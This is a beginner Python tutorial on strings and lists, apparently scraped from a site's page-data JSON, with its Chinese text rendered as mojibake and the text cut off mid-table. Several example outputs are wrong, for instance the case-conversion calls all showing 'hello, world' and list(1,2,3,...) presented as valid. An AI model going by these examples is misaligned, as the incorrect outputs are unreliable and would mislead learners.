¶ä»å¯¹è±¡ï¼é£ä¹ç¼è¯å¨å°±ä¼èªå¨è°ç¨strå°é£å­ç¬¦ä¸²å¯¹è±¡è½¬åä¸ºå­ç¬¦ä¸²ãæä»¬ä¹å¯ä»¥èªå·±è°ç¨strå®ç°æ°å­è½¬åä¸ºå­ç¬¦ä¸²ã\n\nnum = 200\nnum_str = str(20.1)\nprint(num)\n\n\n1\n2\n3\n\n\næ³¨æï¼æè¿éåºç°äºä¸ä¸ªé®é¢ï¼ä¸é¢æä»¬å¨å®ä¹å­ç¬¦ä¸²çæ¶åä½¿ç¨è¿strä½ä¸ºåéãé£ä¹å¨è¿éä½¿ç¨strå½æ°è½¬æ¢æ°å­çæ¶åï¼å°±ä¼æ¥ä¸ä¸ªéï¼æç¤ºtypeerror: \'str\' object is not callableãè¿ä¸ªå¨å¶ä»æä½è¯­è¨ä¸­åæ ·å­å¨çé®é¢ï¼æä»¬å¨ç¼åç¨åºæ¶ï¼ä¸è¦ä½¿ç¨ç³»ç»çä¿çå­ï¼å¹¶ä¸é¿ååå¸¸ç¨çå½æ°ååã\n\n\n# [] æåå­ç¬¦ä¸²åå­ç¬¦ä¸²åç\n\nå­ç¬¦ä¸²çæ¬è´¨æ¯å­ç¬¦åºåï¼æä»¬å¨å­ç¬¦ä¸²åæ·»å []ï¼æå®åç§»éå¯ä»¥è·åè¯¥ä½ç½®çå­ç¬¦ä¸²ãè¿ä¸ªåæ°ç»çæä½ç±»ä¼¼ãpythonä¸­çå­ç¬¦ä¸²ä¹æ¯æååºï¼å³ç´¢å¼ä¸ºè´æ°ã\n\nå­ç¬¦ä¸²åçæä½å¯ä»¥è®©æä»¬å¿«éè·åå­ç¬¦ä¸²çå­ä¸²ï¼è¯­æ³å¦ä¸ï¼\n\næä½                                              ç¤ºä¾                ç»æ\n[:] è·åæ´ä¸ªä¸²                                       "abcdef"[:]       "abcdef"\n[start : ] ä»startå¼å§å°ç»å°¾                          "abcdef"[2:]      "cdef"\n[: end ]ä»å¤´å¼å§å°end - 1                            "abcdef"[:2]      "ab"\n[start : end]ä»start å¼å§å° end - 1                 "abcdef"[2:4]     "cd"\n[start : end : step ]ä»startå¼å§å°end - 1 æ­¥é¿ä¸ºstep   "abcdef"[1:5:2]   "bd"\n\nå½startæendä¸ºè´æ°çæåµï¼\n\nç¤ºä¾                                     è¯´æ                    ç»æ\n"abcdefghijklmnopqrstuv wxyz"[-3:]     åæ°ä¸ä¸ª                  âxyzâ\n"abcdefghijklmnopqrstuv wxyz"[-8:-3]   åæ°ç¬¬å«ä¸ªå°åæ°ç¬¬ ä¸ä¸ª(åå¤´ä¸åå°¾)   \'stuvw\'\n"abcdefghijklmnopqrstuv wxyz"[::-1]    æ­¥é¿ä¸ºè´ï¼ ä»å³å°å·¦ ååæå       \'zyxwvutsrqpon mlkjihgfedcba\'\n\n\n# å­ç¬¦ä¸²åå²ååå¹¶\n\nsplitå½æ°å¯ä»¥æåå­ç¬¦ä¸²ï¼joinå¯ä»¥åå¹¶å­ç¬¦ä¸²ãsplité»è®¤ä½¿ç¨ç©ºæ ¼æåå­ç¬¦ä¸²ãä¹å¯ä»¥æå®æåçåæ°ãä½¿ç¨joinåå¹¶å­ç¬¦ä¸²æ¯ä½¿ç¨+æ¼æ¥å­ç¬¦ä¸²æ´é«æã\n\na = "hello world ! ! ! !"\nprint(a.split()) #[\'hello\', \'world\', \'!\', \'!\', \'!\', \'!\']\nprint(a.split("world")) #[\'hello \', \' ! ! ! !\']\n\na = [\'hello\',\'world\',\'zhangsan\',\'lisi\']\nprint("*".join(a)) # hello*world*zhangsan*lisi\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å­ç¬¦ä¸²æ¯è¾\n\n== != å¤æ­æ¯å¦å«æç¸åçå­ç¬¦\n\nis not is å¤æ­æ¯å¦æ¯åä¸ä¸ªå¯¹è±¡\n\nin not in å¤æ­å­ä¸²å³ç³»\n\nprint( " hello" == " hello") #true\nprint("hello" != "world") # true\na = "hello" \nb = "world"\nprint(a is b) # false\nprint(a is not b) # true\nprint("hello" in "==helloworld") # true\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nå¨pythonä¸­æä¸ä¸ªå­ç¬¦ä¸²é©»çæºå¶ï¼ä»ä¿çä¸ä»½ç¸åçä¸ä¸è¯éçå­ç¬¦ä¸²æ¹æ³ãå¯¹äºå­ç¬¦ä¸²ï¼ä»åå«ä¸åçº¿ãå­æ¯æ°å­ï¼ä¼å¯ç¨å­ç¬¦ä¸²é©»çæºå¶ã\n\na = "aaa_3"\nb = "aaa_3"\nprint(a is b) # true\n\n\n1\n2\n3\n\n\n\n# å­ç¬¦ä¸²æ¥æ¾\n\næ¹æ³                   è¯´æ             ç»æ\nlen(a)               å­ç¬¦ä¸²é¿åº¦          int\na.startwith("aaa")   ä»¥æå®ä½ç½®å¼å§        bool\na.endwith("aaa")     ä»¥æå®ä½ç½®ç»å°¾        bool\na.find(\'a\')          é¦æ¬¡åºç°å­ç¬¦ä¸²çä½ç½®     int\na.rfind(\'b\')         æåä¸æ¬¡åºç°å­ç¬¦ä¸²çä½ç½®   int\na.count(\'aaa\')       æå®å­ç¬¦ä¸²åºç°çæ¬¡æ°     int\na.isalnum()          å¨é¨æ¯æ°å­æå­æ¯       bool\na.isalpha()          æ¯å¦åªæå­æ¯         bool\na.isdigit()          æ¯å¦åªææ°å­         bool\na.isspace()          æ¯å¦ä¸ºç©ºç½          bool\na.isupper()          æ¯å¦ä¸ºå¤§å          bool\na.islower()          æ¯å¦ä¸ºå°å          bool\n\n\n# å»é¤é¦å°¾ä¿¡æ¯\n\næä»¬å¯ä»¥éè¿stripå»é¤é¦å°¾æå®çåå®¹ï¼lstripå»é¤é¦é¨åå®¹ï¼rstripå»é¤å°¾é¨æå®çåå®¹ã\n\na = "   helloworld   "\nprint(a.strip(" ")) #helloworld\n\na = "* helloworld -"\nprint(a.lstrip("*").rstrip("-").strip(" ")) #helloworld\n\n\n1\n2\n3\n4\n5\n\n\n\n# å¤§å°åè½¬æ¢\n\nç¤ºä¾               è¯´æ                  ç»æ\na.capitalize()   äº§çæ°çå­ç¬¦ä¸²ï¼é¦å­æ¯å¤§å       \na.title()        äº§çæ°çå­ç¬¦ä¸²ï¼æ¯ä¸ªåè¯é¦å­æ¯å¤§å   \na.upper()        äº§çæ°çå­ç¬¦ä¸²ï¼ææå­ç¬¦å¤§å      \na.lower()        äº§çæ°çå­ç¬¦ä¸²ï¼ææåè¯å°å      \na.swapcase()     äº§çæ°çå­ç¬¦ä¸²ï¼ææå­ç¬¦å¤§å°åè½¬æ¢   \n\na = "hello, world"\nprint(a.capitalize()) #hello, world\nprint(a.title()) # hello, world\nprint(a.upper()) # hello, world\nprint(a.lower()) # hello, world\nprint(a.swapcase()) # hello, world\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# å­ç¬¦ä¸²æ ¼å¼\n\nå¯ä»¥ä½¿ç¨center\\ljust\\rjustè°æ´å­ç¬¦ä¸²çè¾åºæçã\n\na = "abc"\nprint(a.center(10, "-")) # ---abc----\nprint(a.ljust(10, "-")) # abc-------\nprint(a.rjust(10, "-")) # -------abc\n\n\n1\n2\n3\n4\n\n\npython2.6å¼å§ï¼å¯ä»¥ä½¿ç¨str.formatæ¹å¼è¿è¡å­ç¬¦ä¸²æ ¼å¼åã\n\na = "å§åï¼{0},å¹´é¾ï¼{1}".format("zhangsan",22)\nprint(a) # å§åï¼zhangsan,å¹´é¾ï¼22\n\na = "å§åï¼{name},å¹´é¾ï¼{age}".format(name="zhangsan",age=22)\nprint(a) # å§åï¼zhangsan,å¹´é¾ï¼22\n\n\n1\n2\n3\n4\n5\n\n\nformatåæ¶æ¯æä¸äºç¹æ®çæ ¼å¼åã\n\nprint("{:*>8}".format("a")) # *******a\n\n# : æå®å¡«åçåå®¹ ï¼ > < ^ åå«ä»£è¡¨å³å¯¹é½ï¼å·¦å¯¹é½ï¼å±ä¸­ æ°å­ä»£è¡¨å®½åº¦\n\n\n1\n2\n3\n\n\næ°å­çæ ¼å¼åæ¹å¼åcè¯­è¨ä¸­ç±»ä¼¼ï¼javaä¸­ä½¿ç¨printfä¹åæ ·æ¯æç±»ä¼¼çæ ¼å¼åæ¹å¼ï¼\n\næ°å­           æ ¼å¼        è¾åº          æè¿°\n3.1415926    {:.2f}    3.14        ä¿çå°æ°ç¹åä¸¤ä½\n3.1415926    {:+.2f}   3.14        å¸¦ç¬¦å·ä¿çå°æ°ç¹åä¸¤ä½\n2.71828      {:.0f}    3           ä¸å¸¦å°æ°\n5            {:0>2d}   05          æ°å­è¡¥é¶ (å¡«åå·¦è¾¹, å®½åº¦ä¸º 2)\n5            {:x<4d}   5xxx        æ°å­è¡¥ x (å¡«åå³è¾¹, å®½åº¦ä¸º 4)\n10           {:x<4d}   10xx        æ°å­è¡¥ x (å¡«åå³è¾¹, å®½åº¦ä¸º 4)\n1000000      {:,}      1,000,000   ä»¥éå·åéçæ°å­æ ¼å¼\n0.25         {:.2%}    25.00%      ç¾åæ¯æ ¼å¼\n1000000000   {:.2e}    1.00e+09    ææ°è®°æ³\n13           {:10d}    13          å³å¯¹é½ (é»è®¤, å®½åº¦ä¸º 10)\n13           {:<10d}   13          å·¦å¯¹é½ (å®½åº¦ä¸º 10)\n13           {:^10d}   13          ä¸­é´å¯¹é½ (å®½åº¦ä¸º 10)\n\n\n# å¯åå­ç¬¦ä¸²\n\npythonä¸­çå­ç¬¦ä¸²ä¸æ¯æä¿®æ¹ï¼éè¦ä¿®æ¹çè¯éè¦éæ°åå»ºä¸ä¸ªå­ç¬¦ä¸²ãå¯ä»¥ä½¿ç¨iohæèarrayæ¨¡åï¼å¨æä¿®æ¹ã\n\nimport io\ns = "hello.txt"\nsio = io.stringio(s)\n\nprint(sio) # <_io.stringio object at 0x7fdc180abd90>\n\nprint(sio.getvalue()) # hello.txt\n\nsio.seek(7)\nsio.write("g")\nprint(sio.getvalue()) # hello.tgt\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n----------------------------------------\n\nå°±å°è¿éå§ï¼åé¢å­¦äºå¶ä»éªæä½ä¼ç»§ç»­è¡¥åå°è¿éçã',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"Pythonåºåçé£äºäº",frontmatter:{title:"Pythonåºåçé£äºäº",date:"2022-03-22T12:00:00.000Z",permalink:"/sec/dev/python/sequence",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å®å¨å¼å","Python"],tags:["Python"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/202.%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/2020.Python/01.Python%E5%BA%8F%E5%88%97%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B.html",relativePath:"02.å®å¨/202.å®å¨å¼å/2020.Python/01.Pythonåºåçé£äºäº.md",key:"v-711274d8",path:"/sec/dev/python/sequence/",headers:[{level:2,title:"åè¡¨",slug:"åè¡¨",normalizedTitle:"åè¡¨",charIndex:74},{level:3,title:"åå»ºåè¡¨",slug:"åå»ºåè¡¨",normalizedTitle:"åå»ºåè¡¨",charIndex:1007},{level:3,title:"æ°å¢åç´ ",slug:"æ°å¢åç´ ",normalizedTitle:"æ°å¢åç´ ",charIndex:1970},{level:3,title:"å é¤åç´ ",slug:"å é¤åç´ ",normalizedTitle:"å é¤åç´ ",charIndex:489},{level:3,title:"æ¥çåç´ ",slug:"æ¥çåç´ ",normalizedTitle:"æ¥çåç´ ",charIndex:3569},{level:3,title:"åè¡¨åç[]",slug:"åè¡¨åç",normalizedTitle:"åè¡¨åç[]",charIndex:6183},{level:3,title:"å¶ä»åè¡¨å½æ°",slug:"å¶ä»åè¡¨å½æ°",normalizedTitle:"å¶ä»åè¡¨å½æ°",charIndex:7119},{level:3,title:"å¤ç»´åè¡¨",slug:"å¤ç»´åè¡¨",normalizedTitle:"å¤ç»´åè¡¨",charIndex:7579},{level:2,title:"åç»",slug:"åç»",normalizedTitle:"åç»",charIndex:77},{level:3,title:"åå»ºåç»",slug:"åå»ºåç»",normalizedTitle:"åå»ºåç»",charIndex:7986},{level:3,title:"åç´ è®¿é®åè®¡æ°",slug:"åç´ è®¿é®åè®¡æ°",normalizedTitle:"åç´ è®¿é®åè®¡æ°",charIndex:9291},{level:2,title:"å­å¸",slug:"å­å¸",normalizedTitle:"å­å¸",charIndex:80},{level:3,title:"åå»ºå­å¸",slug:"åå»ºå­å¸",normalizedTitle:"åå»ºå­å¸",charIndex:10221},{level:3,title:"å­å¸åç´ çè®¿é®",slug:"å­å¸åç´ çè®¿é®",normalizedTitle:"å­å¸åç´ çè®¿é®",charIndex:11044},{level:3,title:"å­å¸å¢å æ¹",slug:"å­å¸å¢å æ¹",normalizedTitle:"å­å¸å¢å æ¹",charIndex:11542},{level:3,title:"è¯­æ³ç³ ä¹ åºåè§£å",slug:"è¯­æ³ç³-ä¹-åºåè§£å",normalizedTitle:"è¯­æ³ç³ ä¹ åºåè§£å",charIndex:12684},{level:3,title:"åè¡¨ç»åå­å¸å­å¨åè®¿é®æ°æ®",slug:"åè¡¨ç»åå­å¸å­å¨åè®¿é®æ°æ®",normalizedTitle:"åè¡¨ç»åå­å¸å­å¨åè®¿é®æ°æ®",charIndex:13226},{level:3,title:"å­å¸åºå±åç",slug:"å­å¸åºå±åç",normalizedTitle:"å­å¸åºå±åç",charIndex:13771},{level:2,title:"éå",slug:"éå",normalizedTitle:"éå",charIndex:83},{level:3,title:"éåçç¸å³æä½",slug:"éåçç¸å³æä½",normalizedTitle:"éåçç¸å³æä½",charIndex:14279},{level:2,title:"åèèµæ",slug:"åèèµæ",normalizedTitle:"åèèµæ",charIndex:15419}],excerpt:'<h1 id="pythonåºåçé£äºäº"><a class="header-anchor" href="#pythonåºåçé£äºäº">#</a> Pythonåºåçé£äºäº</h1>\n<blockquote>\n<p>æ¥ä¸ä¸ç¯çãPythonå­ç¬¦ä¸²çé£äºäºãï¼è¿ç¯åå¤æ´çä¸ä¸ Python ä¸­çåºåç±»åçåºç¡ç¨æ³ï¼åå«ï¼å­ç¬¦ä¸²ãåè¡¨ãåç»ãå­å¸ãéåãåç»­æç¸å³çæ·±å¥äºè§£ï¼ä¹ä¼æ´æ°å°è¿éãå­ç¬¦ä¸²å¨ä¸ä¸ç¯è¯´è¿ï¼è¿éå°±ä¸åèµè¿°ã</p>\n</blockquote>\n',headersStr:"åè¡¨ åå»ºåè¡¨ æ°å¢åç´  å é¤åç´  æ¥çåç´  åè¡¨åç[] å¶ä»åè¡¨å½æ° å¤ç»´åè¡¨ åç» åå»ºåç» åç´ è®¿é®åè®¡æ° å­å¸ åå»ºå­å¸ å­å¸åç´ çè®¿é® å­å¸å¢å æ¹ è¯­æ³ç³ ä¹ åºåè§£å åè¡¨ç»åå­å¸å­å¨åè®¿é®æ°æ® å­å¸åºå±åç éå éåçç¸å³æä½ åèèµæ",content:"# Pythonåºåçé£äºäº\n\n> æ¥ä¸ä¸ç¯çãPythonå­ç¬¦ä¸²çé£äºäºãï¼è¿ç¯åå¤æ´çä¸ä¸ Python ä¸­çåºåç±»åçåºç¡ç¨æ³ï¼åå«ï¼å­ç¬¦ä¸²ãåè¡¨ãåç»ãå­å¸ãéåãåç»­æç¸å³çæ·±å¥äºè§£ï¼ä¹ä¼æ´æ°å°è¿éãå­ç¬¦ä¸²å¨ä¸ä¸ç¯è¯´è¿ï¼è¿éå°±ä¸åèµè¿°ã\n\n\n# åè¡¨\n\nåè¡¨æ¯å¯ä»¥å­å¨ ä»»ææ°ç®ãä»»æç±»åçæ°æ®éåãåè¡¨åç½®äºå¯åçåºåï¼åå«å¤ä¸ªåç´ ç æåºä¸è¿ç»­ç åå­ç©ºé´ãå®ä¹æ¹å¼å¦ï¼a = [1,2,3,4]ãå¶ä¸­1ã2ã3ã4ä¸ºåè¡¨açåç´ ï¼åç´ ä¸­å­å¨çæ°æ®ç±»åå¯ä»¥ä»»æï¼ä¸æ¯ä¸å®ç¸åãåè¡¨æå¦ä¸çä¸äºå¸¸ç¨æ¹æ³ï¼\n\næ¹æ³                     è¦ç¹       æè¿°\nlist.append(x)         å¢å åç´      å°åç´  x å¢å å°åè¡¨ list å°¾é¨\nlist.extend(aList)     å¢å åç´      å°åè¡¨ alist ææåç´ å å°åè¡¨ list å°¾é¨\nlist.insert(index,x)   å¢å åç´      å¨åè¡¨ list æå®ä½ç½® index å¤æå¥åç´  x\nlist.remove(x)         å é¤åç´      å¨åè¡¨ list ä¸­å é¤é¦æ¬¡åºç°çæå®åç´  x\nlist.pop([index])      å é¤åç´      å é¤å¹¶è¿ååè¡¨ list æå®ä¸ºæ­¢ index å¤çåç´ ï¼é»è®¤æ¯ æåä¸ä¸ªåç´ \nlist.clear()           å é¤ææåç´    å é¤åè¡¨ææåç´ ï¼å¹¶ä¸æ¯å é¤åè¡¨å¯¹è±¡\nlist.index(x)          è®¿é®åç´      è¿åç¬¬ä¸ä¸ª x çç´¢å¼ä½ç½®ï¼è¥ä¸å­å¨ x åç´ æåºå¼å¸¸\nlist.count(x)          è®¡æ°       è¿åæå®åç´  x å¨åè¡¨ list ä¸­åºç°çæ¬¡æ°\nlen(list)              åè¡¨é¿åº¦     è¿ååè¡¨ä¸­åå«åç´ çä¸ªæ°\nlist.reverse()         ç¿»è½¬åè¡¨     ææåç´ åå°ç¿»è½¬\nlist.sort()            æåº       ææåç´ åå°æåº\nlist.copy()            æµæ·è´      è¿ååè¡¨å¯¹è±¡çæµæ·è´\n\nå­ç¬¦ä¸²ååè¡¨ç±»ä¼¼ï¼é½æ¯åºåçç±»åãå­ç¬¦ä¸²å­å¨çæ¯ç¸åå­ç¬¦ç±»åçåºåï¼èåè¡¨æ¯å­å¨ä»»æç±»åçåºåãå æ­¤ï¼å­ç¬¦ä¸²çä¸äºç¨æ³å¨åè¡¨ä¸ä¹æ¯ä¸æ ·çã\n\n\n# åå»ºåè¡¨\n\nåå»ºåè¡¨æå¤ç§æ¹å¼ï¼è¿éæ´çäºåç§ï¼\n\n 1. åºæ¬çåå»ºæ¹å¼\n    \n    a = [1,2,3,\"hello\",\"world\",True]\n    a = [] # åå»ºç©ºåè¡¨\n    \n    \n    1\n    2\n    \n\n 2. ä½¿ç¨list() åå»º\n    \n    a = list() # åå»ºç©ºåè¡¨\n    a = list(1,2,3,\"aaa\",True)\n    \n    \n    1\n    2\n    \n\n 3. ä½¿ç¨range() åå»º\n    \n    # rangeå¯ä»¥å¸®å©æä»¬åå»ºæ´æ°æ°ç»ï¼è¿å¨forå¾ªç¯ä¸­æå¤§ç¨å¤ã\n    # rangeè¯­æ³æ ¼å¼ä¸ºï¼range(start,end,step)\n    # start: å¯éï¼èµ·å§ä½ç½®ï¼é»è®¤ä¸º0\n    # end: å¿éï¼ç»æä½ç½®\n    # step ï¼ æ­¥é¿ï¼å¯éï¼é»è®¤ä¸º1\n    \n    # å¨python3 ä¸­rangeè¿åä¸ä¸ªrangeå¯¹è±¡ï¼èä¸æ¯ä¸ä¸ªåè¡¨ï¼æä»¬éè¦éè¿listæ¹æ³å°å¶è½¬åä¸ºåè¡¨\n    \n    a = range(5)\n    print(a) # range(0, 5)\n    b = list(range(5))\n    print(b) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    \n\n 4. ä½¿ç¨æ¨å¯¼å¼çæåè¡¨\n    \n    # ä½¿ç¨foræ¨å¯¼å¼çæ¹å¼çææ°ç»ï¼å¨å¼åä¸­ä¹æ¯è¾å¸¸è§ã\n    # åºæ¬çä½¿ç¨æ¹å¼å¦ä¸ï¼\n    a = [x*2 for x in range(5)]\n    print(a) # [0, 2, 4, 6, 8]\n    \n    b = [x*2 for x in range(100) if x%10 == 0]\n    print(b) # [0, 20, 40, 60, 80, 100, 120, 140, 160, 180]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n\n# æ°å¢åç´ \n\nåè¡¨æ¯ä¸ä¸ªå¯åçåºåï¼å¦æåºç°æ°å¢åå é¤åç´ æ¶ï¼pythonä¼èªå¨è¿è¡åå­ç®¡çï¼æå¤§çåå°äºç¨åºåçè´æãä½æ¯å ä¸ºæ¯è¿ç»­çæåºåå­ç©ºé´ï¼æä»¥å¨ä¸äºä½ç½®æå¥å é¤åç´ æçæ¯è¾ä½ï¼æä»¬éå¸¸å¨åè¡¨å°¾é¨å é¤åæå¥åç´ ã\n\n 1. append() è¡¨å°¾æ·»å åç´ \n    \n    a = [1,2]\n    a.append(3)\n    print(a)\n    \n    \n    1\n    2\n    3\n    \n\n 2. +è¿ç®ç¬¦æä½\n    \n    # + è¿ç®ç¬¦ å¹¶ä¸æ¯çæ­£çå¾å°¾é¨æ·»å åç´ ï¼èæ¯åå»ºæ°å¯¹è±¡å°ååè¡¨å¤å¶å°æ°åè¡¨ä¸­ï¼æçå¤ªä½\n    a = [1,2]\n    print(id(a)) # 140213503386560\n    a = a+[3,4]\n    print(id(a)) # 140213234351808\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. Extend() æå±åè¡¨\n    \n    # extend å®æä¸¤ä¸ªåè¡¨çæ¼æ¥ï¼ä¸äº§çæ°å¯¹è±¡\n    a = [1,2]\n    print(id(a)) # 140335909954496\n    b = [3,4]\n    a.extend(b)\n    print(a) # [1, 2, 3, 4]\n    print(id(a)) # 140335909954496\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 4. Insert() æå¥åç´ \n    \n    # insert å¯ä»¥å¨ä»»æä½ç½®æå¥åç´ ï¼ä½æ¯è¿æ ·ä¼å¯¼è´åç´ çç§»å¨ï¼æçè¾ä½ï¼é¿åå¨åè¡¨å¤´é¨æå¥åç´ \n    a = [1,2,3,4]\n    a.insert(0,0)\n    print(a) # [0, 1, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. ä¹æ³å¤å¶\n    \n    # ä¹æ³æå± è¿æ¯è¾çç¥å¥ å¦ææ³å¤å¶ä¸ä¸ªåè¡¨ï¼åªéè¦ä½¿ç¨ä¹æ³\n    # å¨å­ç¬¦ä¸²ä¸­ï¼åæ ·å¯ä»¥ä½¿ç¨ä¹æ³çæ¹å¼å¤å¶å­ç¬¦ä¸²\n    \n    a = [\"zhangsan\",22]\n    b = a*3\n    print(b) # ['zhangsan', 22, 'zhangsan', 22, 'zhangsan', 22]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n\n# å é¤åç´ \n\nå¨åè¡¨ä¸­çå é¤ä¹ä¼å¯¼è´åç´ çç§»å¨ï¼å æ­¤å°½éé¿åéå°¾é¨åç´ çå é¤ï¼ä¼å¯¼è´æçå¤ªä½ã\n\n 1. delå é¤\n    \n    # del å é¤æå®ä½ç½®çåç´ \n    a = [1,2,3,4]\n    del a[1] # [1, 3, 4]\n    print(a)\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. popåºæ \n    \n    # popåºæ  é»è®¤ä»æ«å°¾å é¤ï¼è¿åå¼ä¸ºå é¤çåç´ ï¼ä¹å¯ä»¥ä¼ éindex\n    a = [1,2,3,4]\n    b = a.pop(0)\n    print(a)\n    print(b)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. removeå é¤\n    \n    # remove æå®åç´ å é¤ï¼å é¤ç¬¬ä¸ä¸ªåºç°è¯¥åç´ çä½ç½®\n    a = [1,2,3,4]\n    a.remove(2)\n    print(a) # [1, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    \n\n\n# æ¥çåç´ \n\nPythonä¸­çåè¡¨ç¸å¯¹äºJavaä¸­çæ°ç»ï¼é½å¯ä»¥éè¿idnexå»è®¿é®ä¸ä¸ªåç´ ãä½æ¯Javaä¸­çæ°ç»é¿åº¦ä¸å¯åï¼å¹¶ä¸ä¸å¯ä»¥å­å¨ä»»æçç±»åã\n\n 1. éè¿ç´¢å¼è®¿é®åç´ \n    \n    # éè¿ç´¢å¼è®¿é®åç´  ä»0å¼å§å°len-1\n    a = [2,3,1,4,6,32,2,5,7,2]\n    print(a[0]) # 2\n    print(a[len(a)]) # ç´¢å¼è¶ç IndexError: list index out of range\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. Index() è·ååç´ çç´¢å¼\n    \n    # indexå¯ä»¥æ¥æ¾ç¬¬ä¸æ¬¡åºç°æä¸ªåç´ çindexï¼å¯ä»¥ä¼ å¥ä¸ä¸ªèå´ï¼ä½¿ç¨çæ¹å¼æ¯ï¼a.index(value,[start],[end])\n    a = [1,2,3,4,5,6,7,8,9,10]\n    print(a.index(1)) # 0\n    print(a.index(3,1,5)) # 2\n    print(a.index(11)) # ValueError: 11 is not in list\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 3. Count() è·ååç´ åºç°çæ¬¡æ°\n    \n    # countç¨äºå¤æ­åç´ å¨åè¡¨ä¸­åºç°çæ¬¡æ°,å¦æç»æä¸º0 åè¡¨ç¤ºåè¡¨ä¸­æ²¡æè¿ä¸ªåç´ \n    a = [1,2,3,3,3,4,3,2,1]\n    print(a.count(1)) # 2\n    print(a.count(10)) # 0\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. len() è·ååè¡¨çé¿åº¦\n    \n    # len åå­ç¬¦ä¸²ä¸æ ·ï¼lenå¯ä»¥è·ååè¡¨çé¿åº¦\n    a = [1,2,3,4,5,6,7]\n    print(len(a)) # 7\n    \n    \n    1\n    2\n    3\n    \n\n 5. å¤æ­åè¡¨ä¸­å­å¨æå®åç´ \n    \n    # ä¸é¢è¯´å¦æä¸ä¸ªåç´ çcountä¸ç­äº0 åè¯¥åç´ ä¸å¨åè¡¨ä¸­ã\n    # è¿å¯ä»¥éè¿inè¿è¡ç®ä¾¿å¤æ­\n    a = [1,2,3,5,6,7,8,9]\n    print(a.count(4) == 0) # True\n    print(4 in a) # False\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 6. éååè¡¨çåå®¹\n    \n    # ä½¿ç¨forå¾ªç¯éå\n    a = [1,2,3,4,5,6,7]\n    for x in a:\n        print(x,end=\",\") # 1,2,3,4,5,6,7,\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 7. åè¡¨æåº\n    \n    # sort æåº é»è®¤çåº éåºåreverse=True  ä¸æ°å»ºåè¡¨ï¼ä¿®æ¹ååè¡¨\n    # ä¹±åº shuffle\n    \n    a = [1,3,2,4,5,2,6,8,10]\n    a.sort()\n    print(a) # [1, 2, 2, 3, 4, 5, 6, 8, 10]\n    a.sort(reverse=True)\n    print(a) # [10, 8, 6, 5, 4, 3, 2, 2, 1]\n    \n    import random\n    random.shuffle(a)\n    print(a) # [6, 5, 2, 4, 3, 10, 1, 8, 2]\n    \n    # sorted åå»ºæ°åè¡¨ï¼ä¸ä¿®æ¹ååè¡¨\n    a = [20,10,30,40,22]\n    b = sorted(a)\n    print(a) # [20, 10, 30, 40, 22]\n    print(b) # [10, 20, 22, 30, 40]\n    \n    b = sorted(a,reverse=True)\n    print(b) # [40, 30, 22, 20, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    \n\n 8. åè¡¨è¿­ä»£å¨\n    \n    # å­å¨ä¸ä¸ªåç½®å½æ°reversedä¹å¯ä»¥å¯¹åè¡¨è¿è¡éåºï¼ä½æ¯è¿åçæ¯ä¸ä¸ªè¿­ä»£å¨ã\n    a = [10,2,11,9,13,22]\n    c = reversed(a)\n    print(c) # <list_reverseiterator object at 0x7fd528043fa0>\n    print(list(c))  # [22, 13, 9, 11, 2, 10]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    \n\n 9. åè¡¨å¤å¶\n    \n    # = å¤å¶å°åï¼list1ålist2æååä¸ä¸ªå°å\n    list1 = [1,2,3,4]\n    list2 = list1\n    \n    list2[0] = 0\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [0, 2, 3, 4]\n    \n    # æ¼ç©ºåè¡¨å¤å¶\n    list2 = []+list1\n    list2[0] = 10\n    print(list1) # [0, 2, 3, 4]\n    print(list2) # [10, 2, 3, 4]\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    \n\n\n# åè¡¨åç[]\n\nåçæ¯Pythonä¸­çéè¦æä½ï¼åæ¶ä¹éç¨äºåè¡¨ãåç»ãå­ç¬¦ä¸²ãåçå¸¸è§çè¯­æ³æ ¼å¼æ¯ï¼\n\na[start:end:step]\n\nå¸åçæä½å¦ä¸ï¼\n\næä½åè¯´æ                                       ç¤ºä¾                               ç»æ\n[:]æåæ´ä¸ªåè¡¨                                   [10,20,30][:]                    [10,20,30]\n[start:]ä» start ç´¢å¼å¼å§å° ç»å°¾                    [10,20,30][1:]                   [20,30]\n[:end]ä»å¤´å¼å§ç¥é end-1                          [10,20,30][:2]                   [10,20]\n[start:end]ä» start å° end-1                  [10,20,30,40][1:3]               [20,30]\n[startðstep] ä» start æ åå° end-1ï¼æ­¥é¿æ¯ step   [10,20,30,40,50,60,70][1:6: 2]   [20, 40, 60]\n[10,20,30,40,50,60,70][-3:]                 åæ°ä¸ä¸ª                             [50,60,70]\n[10,20,30,40,50,60,70][-5:-3]               åæ°ç¬¬äºä¸ªå°åæ° ç¬¬ä¸ä¸ª(åå¤´ä¸åå°¾)              [30,40]\n[10,20,30,40,50,60,70][::-1]                æ­¥é¿ä¸ºè´ï¼ä»å³å°å·¦ ååæå                   [70, 